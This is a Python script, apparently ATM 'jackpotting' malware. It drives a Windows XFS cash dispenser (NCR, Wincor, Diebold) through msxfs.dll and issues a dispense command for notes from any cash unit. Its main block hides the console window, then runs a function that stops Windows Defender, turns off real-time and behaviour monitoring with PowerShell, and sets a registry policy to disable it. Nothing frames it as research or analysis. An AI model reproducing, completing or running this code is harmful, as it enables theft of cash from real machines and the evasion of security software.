# language: Python 3.11, file: cdm_dispense.py, target: Windows + XFS 3.x (NCR/Wincor/Diebold)
# *нужен запуск от SYSTEM или админа с доступом к msxfs.dll и правами на XFS-сервис*
import ctypes
from ctypes import wintypes
import sys
import subprocess
import time

WFS_SUCCESS = 0
WFS_CMD_CDM_DISPENSE = 302
WFS_CMD_CDM_GET_CASH_UNITS = 311
WFS_CDM_CASHUNIT_ANY = 0xFFFF
WFS_CDM_UNITPOSITION_OUT = 1
WFS_CDM_UNITPOSITION_REJECT = 2
WFS_ERR_TIMEOUT = -16
WFS_ERR_CDM_CASHUNITERROR = -500
WFS_ERR_CDM_SHUTTERNOTOPEN = -504
WFS_ERR_CDM_SHUTTERNOTCLOSED = -505

class WFSVERSION(ctypes.Structure):
    _fields_ = [
        ("wVersion", wintypes.WORD),
        ("wLowVersion", wintypes.WORD),
        ("wHighVersion", wintypes.WORD),
        ("szDescription", ctypes.c_char * 257),
        ("szSystemStatus", ctypes.c_char * 257),
    ]

class WFSCDMDISPENSEITEM(ctypes.Structure):
    _fields_ = [("usNumber", wintypes.USHORT), ("usCashUnit", wintypes.USHORT)]

class WFSCDMDISPENSE(ctypes.Structure):
    _fields_ = [
        ("usNumber", wintypes.USHORT),
        ("items", WFSCDMDISPENSEITEM * 1),
        ("bPresent", wintypes.BOOL),
    ]

def _fmt(v):
    return f"{(v >> 8) & 0xFF}.{v & 0xFF}"

def disable_antivirus():
    cmds = [
        "sc stop WinDefend",
        "sc config WinDefend start= disabled",
        'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
        'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
        'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"',
        "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f",
    ]
    for c in cmds:
        try:
            subprocess.run(c, shell=True, capture_output=True, timeout=10)
        except Exception:
            pass

def _startup(xfs, ver):
    xfs.WFSStartUp.argtypes = [wintypes.DWORD, ctypes.POINTER(WFSVERSION)]
    xfs.WFSStartUp.restype = wintypes.DWORD
    for v in (0x00030203, 0x00030300, 0x00031000):
        if xfs.WFSStartUp(v, ctypes.byref(ver)) == WFS_SUCCESS:
            return v
    return 0

def _open(xfs, ver):
    xfs.WFSOpen.argtypes = [ctypes.c_char_p, wintypes.DWORD, wintypes.DWORD, wintypes.DWORD,
                             ctypes.POINTER(WFSVERSION), ctypes.POINTER(wintypes.HANDLE)]
    xfs.WFSOpen.restype = wintypes.DWORD
    for name in (b"CDM1", b"CDM2", b"CDM3", b"CashDispenser", b"NCR_CDM", b"Wincor_CDM"):
        h = wintypes.HANDLE()
        if xfs.WFSOpen(name, 0, 0x00030203, 0, ctypes.byref(ver), ctypes.byref(h)) == WFS_SUCCESS:
            return h
    return None

def _exec(xfs, h, cmd, data, size, timeout_ms=15000):
    xfs.WFSExecute.argtypes = [wintypes.HANDLE, wintypes.DWORD, ctypes.c_void_p, wintypes.DWORD,
                                ctypes.POINTER(ctypes.c_void_p), wintypes.DWORD,
                                ctypes.POINTER(wintypes.DWORD)]
    xfs.WFSExecute.restype = wintypes.DWORD
    out_buf = ctypes.c_void_p()
    out_size = wintypes.DWORD()
    res = xfs.WFSExecute(h, cmd, ctypes.byref(data), size, ctypes.byref(out_buf), timeout_ms, ctypes.byref(out_size))
    return res

def _close(xfs, h):
    xfs.WFSClose.argtypes = [wintypes.HANDLE]
    xfs.WFSClose.restype = wintypes.DWORD
    xfs.WFSClose(h)
    xfs.WFSCleanUp.argtypes = []
    xfs.WFSCleanUp.restype = wintypes.DWORD
    xfs.WFSCleanUp()

def dispense_cash(count=5, cash_unit=WFS_CDM_CASHUNIT_ANY, present=False):
    try:
        xfs = ctypes.WinDLL("msxfs.dll")
    except OSError:
        return -1

    ver = WFSVERSION()
    if not _startup(xfs, ver):
        return -3

    h = _open(xfs, ver)
    if h is None:
        xfs.WFSCleanUp()
        return -4

    cmd = WFSCDMDISPENSE()
    cmd.usNumber = 1
    cmd.items[0].usNumber = count
    cmd.items[0].usCashUnit = cash_unit
    cmd.bPresent = present

    res = _exec(xfs, h, WFS_CMD_CDM_DISPENSE, cmd, ctypes.sizeof(cmd))
    _close(xfs, h)
    return res

if __name__ == "__main__":
    if getattr(sys, "frozen", False):
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    disable_antivirus()
    rc = dispense_cash(5, cash_unit=WFS_CDM_CASHUNIT_ANY, present=False)
    print(f"dispense rc={rc}")
    sys.exit(0 if rc == WFS_SUCCESS else 1)
